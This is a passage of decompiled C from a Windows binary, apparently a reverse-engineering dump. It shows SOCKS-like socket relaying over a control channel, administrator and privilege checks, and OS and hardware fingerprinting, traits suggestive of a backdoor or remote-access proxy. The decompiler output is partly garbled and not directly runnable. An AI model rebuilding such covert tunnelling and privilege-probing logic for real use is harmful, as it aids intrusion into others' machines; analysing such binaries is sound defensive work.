    int32_t v6 = &v5;
    int16_t v7; // bp-48, 0x412cd5
    int32_t v8 = v2 + (int32_t)&v7;
    int32_t v9; // 0x412cd5
    int32_t v10 = v9 + 4;
    char * v11 = (char *)v10;
    int32_t v12; // bp-16, 0x412cd5
    int32_t v13 = &v12;
    int32_t v14; // bp-2172, 0x412cd5
    int32_t v15 = &v14; // 0x412ce7
    int32_t v16; // 0x412cd5
    int32_t v17; // 0x412cd5
    int32_t v18; // 0x412cd5
    int32_t v19; // 0x412cd5
    int32_t v20; // 0x412cd5
    int32_t result; // 0x412eac
    int32_t v21; // 0x412d08
    int32_t sock; // 0x412d0b
    int32_t * v22; // 0x412d14
    char * v23; // 0x412d1c
    int128_t v24; // 0x412cd5
    int128_t v25; // 0x412cd5
    int128_t v26; // 0x412cd5
    int128_t v27; // 0x412cd5
    int128_t v28; // 0x412cd5
    while (true) {
      lab_0x412ea8:;
        int32_t v29 = v15;
        int128_t v30 = v28;
        int32_t v31 = v29 - 4; // 0x412eab
        int32_t * v32 = (int32_t *)v31; // 0x412eab
        int32_t v33; // bp-100, 0x412cd5
        *v32 = (int32_t)&v33;
        result = function_412f8a((int32_t)&g322);
        v3 = (int64_t)*(int32_t *)result;
        int32_t v34 = result + v2; // 0x412ebe
        *(int32_t *)v4 = *(int32_t *)v34;
        *(int32_t *)(v4 + v2) = *(int32_t *)(v34 + v2);
        if (g162 == 0) {
            // break -> 0x412ec7
            break;
        }
        // 0x412cec
        *v32 = 12;
        int32_t v35 = function_406fa7(); // 0x412cef
        if (v35 != 0) {
            // 0x412cfa
            *(int32_t *)v35 = 0;
            int32_t v36 = v35 + v2; // 0x412cfe
            *(int32_t *)v36 = 0;
            *(int32_t *)(v36 + v2) = 0;
        }
        int32_t v37 = v3; // 0x412d05
        v21 = 12 * v37;
        sock = v21 + (int32_t)&g176;
        v22 = (int32_t *)sock;
        if (*v22 != v37) {
            // 0x412e8c
            *v32 = v37;
            *(int32_t *)(v29 - 8) = 2;
            function_412f38((int16_t)sock, (char)&g322);
            *(char *)(v35 + 4) = 1;
            *(int32_t *)v35 = v37;
            *v22 = v37;
            int32_t v38 = sock + v2; // 0x412ea3
            int32_t v39 = v35 + v2; // 0x412ea3
            *(int32_t *)v38 = *(int32_t *)v39;
            *(int32_t *)(v38 + v2) = *(int32_t *)(v39 + v2);
            v27 = v30;
            v19 = v31;
            goto lab_0x412ea7;
        } else {
            // 0x412d1c
            v23 = (char *)(v21 + (int32_t)&g176 + 4);
            if (*v23 != 1) {
                // 0x412e72
                *v32 = 0;
                int32_t v40 = *(int32_t *)(v21 + (int32_t)&g176 + 8); // 0x412e7b
                int32_t v41 = v29 - 16; // 0x412e7b
                *(int32_t *)v41 = v40;
                send(sock, (char *)&g322, (int32_t)&g322, (int32_t)&g322);
                v26 = v30;
                v18 = v41;
                goto lab_0x412e84;
            } else {
                // 0x412d26
                *v32 = 2050;
                int32_t * v42 = (int32_t *)(v29 - 8); // 0x412d31
                *v42 = 0;
                int32_t * v43 = (int32_t *)(v29 - 12); // 0x412d33
                *v43 = v6;
                function_401293(v22, (int32_t)&g322, (int32_t)&g322);
                v12 = 0;
                *v32 = 8;
                int32_t v44; // bp-80, 0x412cd5
                __asm_rep_stosd_memset((char *)&v44, 0, 8);
                v7 = 0;
                *(int32_t *)v8 = 0;
                *(int16_t *)(v8 + v2) = 0;
                char v45 = *(char *)(v9 + 3); // 0x412d56
                if (v45 != 1) {
                    if (v45 != 3) {
                        // 0x412dfa
                        v20 = 0;
                        v25 = v30;
                        v17 = v29;
                        if (v45 == 4) {
                            // 0x412dfe
                            *v32 = 2050;
                            *v42 = v6;
                            *v43 = v10;
                            int32_t v46 = v29 - 16; // 0x412e0e
                            *(int32_t *)v46 = 23;
                            InetNtopW((int32_t)v7, &g322, (int16_t *)&g322, (int32_t)&g322);
                            v20 = function_413068();
                            v25 = v30;
                            v17 = v46;
                        }
                        goto lab_0x412e24;
                    } else {
                        int128_t v47 = __asm_xorps(v30, v30); // 0x412d89
                        *v32 = 512;
                        int64_t v48; // 0x412cd5
                        __asm_movlpd(v48, v47);
                        __asm_movlpd(v48, v47);
                        int32_t v49 = function_401000(1); // 0x412db0
                        *v42 = (int32_t)*v11;
                        *v43 = v9 + 5;
                        int32_t v50 = v29 - 16; // 0x412dc0
                        int32_t * v51 = (int32_t *)v50; // 0x412dc0
                        *v51 = v49;
                        function_40126d(&g322, &g322, (int32_t)&g322);
                        *(char *)(v49 + (int32_t)*v11) = 0;
                        *v32 = v13;
                        *v42 = (int32_t)&v44;
                        *v43 = 0;
                        *v51 = v49;
                        int32_t v52 = getaddrinfo((char *)&g322, (char *)&g322, (struct addrinfo *)&g322, (struct addrinfo **)&g322); // 0x412ddc
                        v24 = v47;
                        v16 = v50;
                        v20 = 0;
                        v25 = v47;
                        v17 = v50;
                        if (v52 != 0) {
                            goto lab_0x412e24;
                        } else {
                            goto lab_0x412d7b;
                        }
                    }
                } else {
                    // 0x412d5d
                    *v32 = 2050;
                    *v42 = v6;
                    *v43 = v10;
                    int32_t v53 = v29 - 16; // 0x412d6d
                    *(int32_t *)v53 = 2;
                    InetNtopW((int32_t)v7, &g322, (int16_t *)&g322, (int32_t)&g322);
                    v24 = v30;
                    v16 = v53;
                    goto lab_0x412d7b;
                }
            }
        }
    }
    // 0x412ec7
    return result;
  lab_0x412ea7:
    // 0x412ea7
    v28 = v27;
    v15 = v19 + 4;
    goto lab_0x412ea8;
  lab_0x412e84:
    // 0x412e84
    function_401014((int32_t)&g322);
    v27 = v26;
    v19 = v18 - 4;
    goto lab_0x412ea7;
  lab_0x412d7b:
    // 0x412d7b
    v20 = function_4130de();
    v25 = v24;
    v17 = v16;
    goto lab_0x412e24;
  lab_0x412e24:;
    int32_t * v54 = (int32_t *)(v17 - 4); // 0x412e24
    *v54 = (int32_t)v3;
    v7 = 5;
    int32_t * v55 = (int32_t *)(v17 - 8); // 0x412e30
    *v55 = 10;
    function_412f38(5, 1);
    *(int32_t *)(v21 + (int32_t)&g176 + 8) = v20;
    struct _SECURITY_ATTRIBUTES * lpThreadAttributes; // bp-36, 0x412cd5
    *v54 = (int32_t)&lpThreadAttributes;
    *v23 = 2;
    *v55 = 0;
    int32_t v56 = 12 * *v22 + (int32_t)&g176; // 0x412e56
    lpThreadAttributes = NULL;
    *(int32_t *)(v17 - 12) = sock;
    *(int32_t *)(v17 - 16) = 0x412ecc;
    *(int32_t *)(v17 - 20) = 0;
    *(int32_t *)v56 = *v22;
    int32_t v57 = v56 + v2; // 0x412e66
    int32_t v58 = sock + v2; // 0x412e66
    int32_t v59 = v17 - 24; // 0x412e67
    *(int32_t *)v59 = 0;
    *(int32_t *)v57 = *(int32_t *)v58;
    *(int32_t *)(v57 + v2) = *(int32_t *)(v58 + v2);
    CreateThread(lpThreadAttributes, (int32_t)&g322, (int32_t (*)(int32_t *))&g322, &g322, (int32_t)&g322, &g322);
    v26 = v25;
    v18 = v59;
    goto lab_0x412e84;
}

// Address range: 0x412ecc - 0x412f38
int32_t function_412ecc(int32_t result) {
    int32_t v1 = *(int32_t *)(result + 8); // 0x412edd
    if (g162 == 0) {
        // 0x412f34
        return result;
    }
    // 0x412ee2
    int32_t v2; // bp-16, 0x412ecc
    int32_t v3 = &v2;
    int32_t * v4 = (int32_t *)(v3 - 4); // 0x412ee3
    *v4 = 0x2000;
    int32_t v5 = function_401000((int32_t)&g322); // 0x412ee8
    *v4 = 0;
    *(int32_t *)(v3 - 8) = 0x1f40;
    *(int32_t *)(v3 - 12) = v5;
    int32_t v6 = v3 - 16; // 0x412ef8
    *(int32_t *)v6 = v1;
    int32_t v7 = recv((int32_t)&g322, (char *)&g322, (int32_t)&g322, (int32_t)&g322); // 0x412ef9
    int32_t * v8 = (int32_t *)(v3 - 20);
    while (v7 >= 1) {
        // 0x412f08
        *v8 = *(int32_t *)result;
        *(int32_t *)(v3 - 24) = v7;
        function_412f38((int16_t)&g322, (char)&g322);
        *(int32_t *)(v3 - 28) = v5;
        int32_t result2 = function_401014((int32_t)&g322); // 0x412f21
        if (g162 == 0) {
            // 0x412f34
            return result2;
        }
        v3 = v6;
        v4 = (int32_t *)(v3 - 4);
        *v4 = 0x2000;
        v5 = function_401000((int32_t)&g322);
        *v4 = 0;
        *(int32_t *)(v3 - 8) = 0x1f40;
        *(int32_t *)(v3 - 12) = v5;
        v6 = v3 - 16;
        *(int32_t *)v6 = v1;
        v7 = recv((int32_t)&g322, (char *)&g322, (int32_t)&g322, (int32_t)&g322);
        v8 = (int32_t *)(v3 - 20);
    }
    // 0x412f25
    *v8 = v1;
    closesocket((int32_t)&g322);
    *(int32_t *)(v3 - 24) = v5;
    // 0x412f34
    return function_401014((int32_t)&g322);
}

// Address range: 0x412f38 - 0x412f8a
int32_t function_412f38(int16_t a1, char a2) {
    int32_t v1 = a1;
    int32_t buf = function_401000(0x2000); // 0x412f4e
    *(int32_t *)buf = (int32_t)a2;
    *(int32_t *)(buf + 4) = v1;
    int32_t v2; // 0x412f38
    function_40126d((int32_t *)(buf + 8), (int32_t *)v2, v1);
    send(g174, (char *)buf, (int32_t)(a1 + 8), 0);
    return function_401014(buf);
}

// Address range: 0x412f8a - 0x413068
int32_t function_412f8a(int32_t result) {
    int32_t v1 = function_401000(0x2000); // 0x412fa1
    int32_t v2 = function_401000(0x2000); // 0x412fa9
    int32_t * v3 = (int32_t *)result; // 0x412fb9
    *v3 = 0;
    bool v4; // 0x412f8a
    int32_t v5 = v4 ? -4 : 4; // 0x412fb9
    int32_t v6 = v5 + result; // 0x412fb9
    *(int32_t *)v6 = 0;
    *(int32_t *)(v6 + v5) = 0;
    int32_t v7 = 0; // 0x412fc1
    int32_t v8; // bp-32, 0x412f8a
    int32_t v9 = &v8;
    *(int32_t *)(v9 - 4) = 0;
    *(int32_t *)(v9 - 8) = 8 - v7;
    *(int32_t *)(v9 - 12) = v2;
    int32_t v10 = v9 - 16; // 0x412fcf
    *(int32_t *)v10 = g174;
    int32_t v11 = recv((int32_t)&g322, (char *)&g322, (int32_t)&g322, (int32_t)&g322); // 0x412fd2
    int32_t v12; // 0x412f8a
    int32_t v13; // 0x412f8a
    int32_t v14; // 0x412f8a
    int32_t v15; // 0x413003
    while (v11 >= 1) {
        // 0x412fe4
        *(int32_t *)(v9 - 20) = v11;
        *(int32_t *)(v9 - 24) = v2;
        *(int32_t *)(v9 - 28) = v7 + v1;
        function_40126d((int32_t *)v11, &g322, (int32_t)&g322);
        v7 += v11;
        if (v7 >= 8) {
            // 0x412ffc
            v15 = *(int32_t *)(v1 + 4);
            v13 = v10;
            v12 = 0;
            v14 = v10;
            if (v15 < 1) {
                goto lab_0x413044;
            } else {
                goto lab_0x41300d;
            }
        }
        v9 = v10;
        *(int32_t *)(v9 - 4) = 0;
        *(int32_t *)(v9 - 8) = 8 - v7;
        *(int32_t *)(v9 - 12) = v2;
        v10 = v9 - 16;
        *(int32_t *)v10 = g174;
        v11 = recv((int32_t)&g322, (char *)&g322, (int32_t)&g322, (int32_t)&g322);
    }
  lab_0x41305a:
    // 0x41305a
    g162 = 0;
    // 0x413061
    return result;
  lab_0x413044:
    // 0x413044
    *(int32_t *)(v14 - 4) = v2;
    *v3 = *(int32_t *)v1;
    *(int32_t *)(result + 4) = v15;
    *(int32_t *)(result + 8) = v1;
    function_401014((int32_t)&g322);
    return result;
  lab_0x41300d:
    // 0x41300d
    *(int32_t *)(v13 - 4) = 0;
    *(int32_t *)(v13 - 8) = v15 - v12;
    *(int32_t *)(v13 - 12) = v2;
    int32_t v16 = v13 - 16; // 0x413015
    *(int32_t *)v16 = g174;
    int32_t v17 = recv((int32_t)&g322, (char *)&g322, (int32_t)&g322, (int32_t)&g322); // 0x413018
    if (v17 < 1) {
        goto lab_0x41305a;
    } else {
        // 0x41302a
        *(int32_t *)(v13 - 20) = v17;
        *(int32_t *)(v13 - 24) = v2;
        *(int32_t *)(v13 - 28) = v12 + v1;
        function_40126d((int32_t *)v17, &g322, (int32_t)&g322);
        int32_t v18 = v17 + v12; // 0x413037
        v13 = v16;
        v12 = v18;
        v14 = v16;
        if (v18 < v15) {
            goto lab_0x41300d;
        } else {
            goto lab_0x413044;
        }
    }
}

// Address range: 0x413068 - 0x4130de
int32_t function_413068(void) {
    int32_t sock_fd = socket(AF_IRDA, SOCK_STREAM, IPPROTO_TCP); // 0x413081
    int16_t addr = 23; // bp-36, 0x413087
    int32_t v1 = &addr; // bp-28, 0x413094
    bool v2; // 0x413068
    int32_t v3 = v2 ? -4 : 4; // 0x413094
    int32_t v4 = v3 + (int32_t)&v1; // 0x413094
    int32_t v5; // 0x413068
    int32_t v6 = v3 + v5; // 0x413094
    *(int32_t *)v4 = *(int32_t *)v6;
    int32_t v7 = v4 + v3; // 0x413099
    int32_t v8 = v6 + v3; // 0x413099
    *(int32_t *)v7 = *(int32_t *)v8;
    *(int32_t *)(v7 + v3) = *(int32_t *)(v8 + v3);
    if (connect(sock_fd, (struct sockaddr *)&addr, 28) != -1) {
        // 0x4130ab
        int32_t v9; // bp-2088, 0x413068
        function_401293(&v9, 0, 2050);
        InetNtopW(23, &v1, (int16_t *)&v9, 2050);
    }
    // 0x4130d6
    return sock_fd;
}

// Address range: 0x4130de - 0x413153
int32_t function_4130de(void) {
    int32_t sock_fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP); // 0x4130fa
    int32_t addr = 2; // bp-24, 0x41310a
    if (connect(sock_fd, (struct sockaddr *)&addr, 16) != -1) {
        // 0x413122
        int32_t v1; // bp-2076, 0x4130de
        function_401293(&v1, 0, 2050);
        int32_t v2; // bp-8, 0x4130de
        InetNtopW(2, &v2, (int16_t *)&v1, 2050);
    }
    // 0x41314c
    return sock_fd;
}

// Address range: 0x413153 - 0x4131a1
int32_t function_413153(int32_t a1) {
    int32_t lpString1 = function_401000(264); // 0x41315f
    int32_t result; // 0x413153
    int32_t lpString2; // 0x413153
    if (lpString2 == 0 || lpString1 == 0) {
        // 0x413194
        function_401014(lpString1);
        result = 0;
    } else {
        // 0x41316f
        lstrcpyA((char *)lpString1, (char *)lpString2);
        CreateThread(NULL, 0, (int32_t (*)(int32_t *))0x412bca, (int32_t *)lpString1, 0, NULL);
        result = 1;
    }
    // 0x41319d
    return result;
}

// Address range: 0x4131a1 - 0x4131a4
int32_t function_4131a1(void) {
    // 0x4131a1
    int32_t result; // 0x4131a1
    return result;
}

// Address range: 0x4131a4 - 0x4131f8
int32_t function_4131a4(void) {
    int32_t * moduleHandle = LoadLibraryA("ntdll.dll"); // 0x4131bc
    if (moduleHandle != NULL) {
        // 0x4131c6
        if (GetProcAddress(moduleHandle, "RtlGetVersion") == NULL) {
            // 0x4131f1
            return 0;
        }
    }
    // 0x4131df
    char v1; // 0x4131a4
    if (v1 != 2) {
        // 0x4131e9
        return v1 == 3;
    }
    // 0x4131f1
    return 1;
}

// Address range: 0x4131f8 - 0x413248
int32_t function_4131f8(void) {
    int32_t * moduleHandle = LoadLibraryA("ntdll.dll"); // 0x413210
    if (moduleHandle != NULL) {
        // 0x41321a
        if (GetProcAddress(moduleHandle, "RtlGetVersion") == NULL) {
            // 0x41323c
            return 0;
        }
    }
    int32_t v1; // 0x4131f8
    if (v1 == 2) {
        // 0x41323c
        int32_t result; // 0x4131f8
        return result;
    }
    // 0x41323c
    return 0;
}

// Address range: 0x413248 - 0x4132f4
int32_t function_413248(int32_t a1) {
    int32_t cchReferencedDomainName = 16; // bp-20, 0x413255
    int32_t pSid = 0; // bp-8, 0x413267
    int32_t pIdentifierAuthority = 0; // bp-16, 0x41326e
    int32_t Name; // bp-580, 0x413248
    function_401293(&Name, 0, 520);
    int32_t cchName = 260; // bp-24, 0x41327f
    struct _SID_IDENTIFIER_AUTHORITY * v1 = (struct _SID_IDENTIFIER_AUTHORITY *)&pIdentifierAuthority; // bp-632, 0x41329c
    bool v2 = AllocateAndInitializeSid((struct _SID_IDENTIFIER_AUTHORITY *)&pIdentifierAuthority, 2, 32, 544, 0, 0, 0, 0, 0, 0, (int32_t **)&pSid); // 0x41329d
    int32_t v3 = (int32_t)&v1; // 0x4132a5
    int32_t v4; // 0x413248
    if (!v2) {
        goto lab_0x4132cc;
    } else {
        int16_t * v5 = NULL; // bp-660, 0x4132c1
        v3 = (int32_t)&v5;
        int32_t peUse; // bp-28, 0x413248
        int32_t ReferencedDomainName; // bp-60, 0x413248
        bool v6 = LookupAccountSidW(NULL, (int32_t *)pSid, (int16_t *)&Name, &cchName, (int16_t *)&ReferencedDomainName, &cchReferencedDomainName, &peUse); // 0x4132c2
        v4 = v3;
        if (v6) {
            goto lab_0x4132d2;
        } else {
            goto lab_0x4132cc;
        }
    }
  lab_0x4132cc:
    // 0x4132cc
    GetLastError();
    v4 = v3;
    goto lab_0x4132d2;
  lab_0x4132d2:;
    int32_t v7 = v4; // 0x4132d5
    if (pSid != 0) {
        int32_t v8 = v4 - 4; // 0x4132d7
        *(int32_t *)v8 = pSid;
        FreeSid(&g322);
        v7 = v8;
    }
    // 0x4132e0
    *(int32_t *)(v7 - 4) = (int32_t)&Name;
    function_40460a((int16_t *)&g322);
    int32_t result; // 0x413248
    return result;
}

// Address range: 0x4132f4 - 0x41337b
int32_t function_4132f4(void) {
    // 0x4132f4
    int128_t v1; // 0x4132f4
    int128_t v2 = v1;
    int32_t PreviousState = 0; // bp-52, 0x413302
    bool v3; // 0x4132f4
    int32_t v4 = v3 ? -4 : 4; // 0x413302
    int32_t v5 = v4 + (int32_t)&PreviousState; // 0x413302
    int32_t TokenHandle = 0; // bp-8, 0x413308
    int64_t v6; // 0x4132f4
    __asm_movlpd(v6, __asm_xorps(v2, v2));
    int32_t ReturnLength = 0; // bp-12, 0x413312
    *(int32_t *)v5 = 0;
    int32_t v7 = v5 + v4; // 0x413315
    *(int32_t *)v7 = 0;
    *(int32_t *)(v7 + v4) = 0;
    int32_t ProcessHandle; // 0x4132f4
    if (!OpenProcessToken((int32_t *)ProcessHandle, 40, (int32_t **)&TokenHandle)) {
        // 0x413376
        return 0;
    }
    // 0x413329
    int64_t lpLuid; // bp-20, 0x4132f4
    bool v8 = LookupPrivilegeValueW(NULL, (int16_t *)ProcessHandle, (struct _LUID *)&lpLuid); // 0x413330
    int32_t result = 0; // 0x413338
    if (v8) {
        int32_t NewState = 1; // bp-36, 0x41334a
        bool v9 = AdjustTokenPrivileges((int32_t *)TokenHandle, false, (struct _TOKEN_PRIVILEGES *)&NewState, 16, (struct _TOKEN_PRIVILEGES *)&PreviousState, &ReturnLength); // 0x413366
        result = v9;
    }
    // 0x413376
    return result;
}

// Address range: 0x41337b - 0x4133fb
int32_t function_41337b(int32_t a1) {
    // 0x41337b
    int32_t lpLibFileName; // 0x41337b
    int32_t * hModule = LoadLibraryExW((int16_t *)lpLibFileName, NULL, 2); // 0x413386
    if (hModule == (int32_t *)-1) {
        // 0x4133f7
        return 0;
    }
    int32_t * hResInfo = FindResourceW(hModule, (int16_t *)1, (int16_t *)16); // 0x41339a
    if (hResInfo == NULL) {
        // 0x4133f7
        return 0;
    }
    int32_t * v1 = LoadResource(hModule, hResInfo); // 0x4133a6
    int32_t result = 0; // 0x4133ae
    if (v1 != NULL) {
        int32_t v2 = (int32_t)v1; // 0x4133a6
        uint32_t v3 = *(int32_t *)(v2 + 40); // 0x4133b3
        *(int32_t *)lpLibFileName = *(int32_t *)(v2 + 20);
        *(int16_t *)(lpLibFileName + 4) = *(int16_t *)(v2 + 26);
        *(int16_t *)(lpLibFileName + 6) = *(int16_t *)(v2 + 24);
        *(int32_t *)(lpLibFileName + 8) = v3 % 2;
        *(int32_t *)(lpLibFileName + 12) = v3 / 2 % 2;
        *(int32_t *)(lpLibFileName + 16) = v3 / 8 % 2;
        *(int32_t *)(lpLibFileName + 20) = v3 / 32 % 2;
        FreeLibrary(hModule);
        result = 1;
    }
    // 0x4133f7
    return result;
}

// Address range: 0x4133fb - 0x41340d
int32_t function_4133fb(void) {
    // 0x4133fb
    int32_t v1; // 0x4133fb
    return SHCreateDirectoryExW(NULL, (int16_t *)v1, NULL) == 0;
}

// Address range: 0x41340d - 0x413446
int32_t function_41340d(void) {
    int32_t phkResult = 0; // bp-8, 0x413411
    int32_t hKey; // 0x41340d
    int32_t v1 = RegOpenKeyExW((int32_t *)hKey, (int16_t *)hKey, 0, 0x20019, (int32_t **)&phkResult); // 0x413423
    if (v1 == 2) {
        // 0x41342e
        return 0;
    }
    // 0x413432
    if (phkResult != 0) {
        // 0x413438
        RegCloseKey((int32_t *)phkResult);
    }
    // 0x41342e
    return 1;
}

// Address range: 0x413446 - 0x413449
int32_t function_413446(void) {
    // 0x413446
    int32_t result; // 0x413446
    return result;
}

// Address range: 0x413449 - 0x41344c
int32_t function_413449(void) {
    // 0x413449
    int32_t result; // 0x413449
    return result;
}

// Address range: 0x41344c - 0x413473
int32_t function_41344c(void) {
    // 0x41344c
    if (function_41471f() != 0) {
        int32_t result = function_41473a(); // 0x413460
        if (result != 0) {
            // 0x41346a
            return result;
        }
    }
    // 0x41346a
    return 0;
}

// Address range: 0x413473 - 0x4134a0
int32_t function_413473(void) {
    // 0x413473
    if (function_41471f() != 0) {
        // 0x41347f
        if (function_41473a() != 0) {
            // 0x413491
            return 1;
        }
    }
    // 0x413491
    return 0;
}

// Address range: 0x4134a0 - 0x4135d1
int32_t function_4134a0(void) {
    // 0x4134a0
    CoInitializeSecurity(NULL, -1, NULL, NULL, 0, 3, NULL, 0, NULL);
    int32_t v1 = 0; // bp-92, 0x4134bd
    int32_t v2; // 0x4134a0
    int32_t result; // 0x4134a0
    if (CoInitialize(NULL) < 0) {
        // 0x413512
        v2 = &v1;
        *(int32_t *)(v2 - 4) = (int32_t)&g15;
        function_40460a((int16_t *)&g322);
        return result;
    }
    int32_t v3 = 0; // bp-8, 0x4134cb
    int32_t v4 = &g1; // bp-112, 0x4134d7
    int32_t v5 = CoCreateInstance((int32_t)&g1, NULL, 23, &g118, (int32_t **)&v3); // 0x4134dc
    if (v5 < 0) {
        // 0x413512
        v2 = &v4;
        *(int32_t *)(v2 - 4) = (int32_t)&g15;
        function_40460a((int16_t *)&g322);
        return result;
    }
    int32_t v6 = v3; // bp-148, 0x413501
    if (*(int32_t *)v3 >= 0) {
        // 0x413524
        abort();
        // UNREACHABLE
    }
    int32_t v7 = (int32_t)&v6 - 4; // 0x41350e
    *(int32_t *)v7 = v3;
    // 0x413512
    *(int32_t *)(v7 - 4) = (int32_t)&g15;
    function_40460a((int16_t *)&g322);
    return result;
}

// Address range: 0x4135d1 - 0x4136a5
int32_t function_4135d1(int32_t a1, int32_t a2, int32_t a3) {
    int128_t v1 = __asm_movaps_1(g136); // 0x4135d7
    uint32_t v2 = __asm_cpuid(-0x80000000).e0; // 0x4135f1
    int128_t v3; // 0x4135d1
    __asm_movups(v3, v1);
    int32_t v4; // bp-108, 0x4135d1
    int32_t v5 = &v4; // 0x4135f9
    int128_t v6 = v2; // bp-32, 0x4135fe
    int32_t * v7 = (int32_t *)(v5 - 4);
    int32_t * v8; // 0x4135d1
    int32_t v9; // 0x4135d1
    int32_t v10; // 0x4135d1
    int32_t v11; // bp-96, 0x4135d1
    int32_t v12; // 0x4135d1
    int32_t v13; // 0x4135d1
    int32_t v14; // 0x4135d1
    int32_t v15; // 0x413618
    if (v2 <= 0xffffffff) {
        int32_t v16 = &v6; // 0x413617
        bool v17; // 0x4135d1
        v12 = v17 ? -4 : 4;
        v13 = v12 + v16;
        v14 = v13 + v12;
        v9 = -0x80000000;
        while (true) {
          lab_0x413613:
            // 0x413613
            v10 = v9;
            *v7 = v16;
            v15 = __asm_cpuid_2(v10).e0;
            v6 = v15;
            v8 = &v11;
            if (v10 != -0x7ffffffe) {
                // 0x413639
                int32_t v18; // bp-80, 0x4135d1
                v8 = &v18;
                if (v10 != -0x7ffffffd) {
                    // 0x413646
                    int32_t v19; // bp-64, 0x4135d1
                    v8 = &v19;
                    if (v10 != -0x7ffffffc) {
                        goto lab_0x41365b;
                    } else {
                        goto lab_0x413651;
                    }
                } else {
                    goto lab_0x413651;
                }
            } else {
                goto lab_0x413651;
            }
        }
    }
  lab_0x413664:
    // 0x413664
    *v7 = 512;
    int32_t v20 = function_401000((int32_t)v6); // 0x413669
    *v7 = 16;
    __asm_rep_movsd_memcpy((char *)v20, (char *)&v11, 16);
    *v7 = v20;
    function_40434f((char *)&g322);
    function_4040d5(&g322);
    function_406f1d();
    *(int32_t *)(v5 - 12) = v20;
    function_401014((int32_t)&g322);
    int32_t result; // 0x4135d1
    return result;
  lab_0x413651:
    // 0x413651
    *v8 = v15;
    int32_t v21 = v12 + (int32_t)v8; // 0x413654
    *(int32_t *)v21 = *(int32_t *)v13;
    int32_t v22 = v21 + v12; // 0x413655
    *(int32_t *)v22 = *(int32_t *)v14;
    *(int32_t *)(v22 + v12) = *(int32_t *)(v14 + v12);
    goto lab_0x41365b;
  lab_0x41365b:;
    int32_t v23 = v10 + 1; // 0x41365b
    v9 = v23;
    if (v23 > v2) {
        // break -> 0x413664
        goto lab_0x413664;
    }
    goto lab_0x413613;
}

// Address range: 0x4136a5 - 0x4136c8
int32_t function_4136a5(void) {
    int32_t lpBuffer = 64; // bp-68, 0x4136ae
    GlobalMemoryStatusEx((struct _MEMORYSTATUSEX *)&lpBuffer);
    int32_t v1; // 0x4136a5
    return v1 / 0x100000 | 0x1000 * v1;
}

// Address range: 0x4136c8 - 0x413893
int32_t function_4136c8(void) {
    // 0x4136c8
    int32_t v1; // 0x4136c8
    uint32_t v2 = v1;
    char v3; // 0x4136c8
    char v4 = v3;
    char * v5 = "ntdll.dll"; // bp-292, 0x4136d1
    int32_t v6 = 284; // bp-288, 0x4136d6
    int32_t * moduleHandle = LoadLibraryA("ntdll.dll"); // 0x4136e0
    int32_t v7 = (int32_t)&v5; // 0x4136e8
    if (moduleHandle != NULL) {
        // 0x4136ea
        if (GetProcAddress(moduleHandle, "RtlGetVersion") == NULL) {
            // 0x41388f
            return 0;
        }
        int32_t v8 = &v6; // bp-304, 0x413704
        v7 = &v8;
    }
    // 0x413707
    *(int32_t *)(v7 - 4) = 2;
    if (v1 != 2) {
        // 0x41388f
        return 0;
    }
    int16_t v9; // 0x4136c8
    if (v4 != 1) {
        if (v4 != 2 == (v4 != 3)) {
            // 0x41388f
            return 0;
        }
        if (v1 == 5) {
            if (v1 == 1) {
                // 0x413807
                return (int32_t)v9 + 0x13ec;
            }
            if (v1 == 2) {
                // 0x41381a
                return (int32_t)v9 + 0x1450;
            }
            // 0x41388f
            return 0;
        }
        if (v1 != 6) {
            if (v1 == 0 == v1 == 10) {
                // 0x413884
                return (int32_t)v9 + 0x2710;
            }
            // 0x41388f
            return 0;
        }
        if (v1 == 0) {
            // 0x413838
            return (int32_t)v9 + 0x1770;
        }
        if (v1 == 1) {
            // 0x413848
            return (int32_t)v9 + 0x17d4;
        }
        if (v1 == 2) {
            // 0x413857
            return (int32_t)v9 + 0x1838;
        }
        if (v1 == 3) {
            // 0x413867
            return (int32_t)v9 + 0x189c;
        }
        // 0x41388f
        return 0;
    }
    if (v1 == 5) {
        if (v1 == 0) {
            // 0x413734
            return (int32_t)v9 + 500;
        }
        if (v1 == 1) {
            // 0x413744
            return (int32_t)v9 + 510;
        }
        if (v1 == 2) {
            // 0x413757
            return (int32_t)v9 + 520;
        }
        // 0x41388f
        return 0;
    }
    if (v1 != 6) {
        if (v1 != 10) {
            // 0x41388f
            return 0;
        }
        if (v2 < 0x4e20) {
            // 0x4137cd
            return (int32_t)v9 + 1000;
        }
        if (v2 >= 0x4e21) {
            // 0x4137de
            return (int32_t)v9 + 1100;
        }
        // 0x41388f
        return 0;
    }
    if (v1 == 0) {
        // 0x413775
        return (int32_t)v9 + 600;
    }
    if (v1 == 1) {
        // 0x413785
        return (int32_t)v9 + 610;
    }
    if (v1 == 2) {
        // 0x413794
        return (int32_t)v9 + 620;
    }
    if (v1 == 3) {
        // 0x4137a8
        return (int32_t)v9 + 630;
    }
    // 0x41388f
    return 0;
}

// Address range: 0x413893 - 0x4138ef
int32_t function_413893(void) {
    bool v1 = OpenProcessToken(GetCurrentProcess(), (int32_t)&g322, (int32_t **)&g322); // 0x4138ac
    int32_t result = 0; // 0x4138b4
    if (v1) {
        int32_t ReturnLength = 4; // bp-12, 0x4138bc
        int32_t TokenInformation; // bp-16, 0x413893
        bool v2 = GetTokenInformation(NULL, 20, &TokenInformation, 4, &ReturnLength); // 0x4138ca
        result = !((!v2 | TokenInformation == 0));
    }
    // 0x4138e5
    return result;
}

// Address range: 0x4138ef - 0x41390c
int32_t function_4138ef(void) {
    int32_t * processHandle = GetCurrentProcess(); // 0x4138f3
    return function_414a05((int32_t)processHandle) != 0;
}

// Address range: 0x41390c - 0x413915
bool function_41390c(int16_t * pszPath) {
    // 0x41390c
    int32_t v1; // 0x41390c
    return PathFileExistsW((int16_t *)v1);
}

// Address range: 0x413915 - 0x413960
int32_t function_413915(void) {
    // 0x413915
    int32_t v1; // bp-524, 0x413915
    function_401293(&v1, 0, 0);
    int32_t result; // 0x413915
    SHGetSpecialFolderPathW(NULL, (int16_t *)&v1, result, false);
    function_40460a((int16_t *)&v1);
    return result;
}

// Address range: 0x413960 - 0x4139ad
int32_t function_413960(void) {
    int32_t v1 = function_401000(2000); // 0x41396d
    int32_t result; // 0x413960
    *(int32_t *)result = 0;
    int16_t * lpFilename = (int16_t *)v1; // 0x41397e
    GetModuleFileNameW(NULL, lpFilename, 1000);
    function_4043c7(function_40460a(lpFilename));
    function_406f1d();
    function_401014(v1);
    return result;
}

// Address range: 0x4139ad - 0x4139e7
int32_t function_4139ad(void) {
    int32_t nSize = 16; // bp-8, 0x4139b9
